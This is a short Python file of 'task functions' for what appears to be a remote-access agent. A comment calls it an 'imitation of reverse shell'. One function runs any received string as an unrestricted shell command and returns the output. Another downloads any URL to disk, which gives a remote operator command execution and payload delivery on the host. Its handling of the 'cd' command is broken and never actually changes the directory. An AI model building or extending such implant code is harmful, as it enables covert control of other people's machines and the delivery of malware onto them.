# task functions
import os
import subprocess
import requests

current_working_directory = os.getcwd()

# imitation of reverse shell
def execute_command_task(command):
    global current_working_directory
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        result = result.strip()  # Strip leading and trailing whitespace

        # If the command was a cd command, update the current working directory
        if command.startswith('cd'):
            current_working_directory = os.getcwd()
            return f"Changed directory to {current_working_directory}"

        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"


def download_file_task(url):
    global current_working_directory
    try:
        # Download the file
        response = requests.get(url)
        filename = url.split('/')[-1]
        filepath = os.path.join(current_working_directory, filename)
        with open(filepath, 'wb') as f:
            f.write(response.content)

        return f"Successfully downloaded {filename} to {current_working_directory}"
    except Exception as e:
        return f"Error: {e}"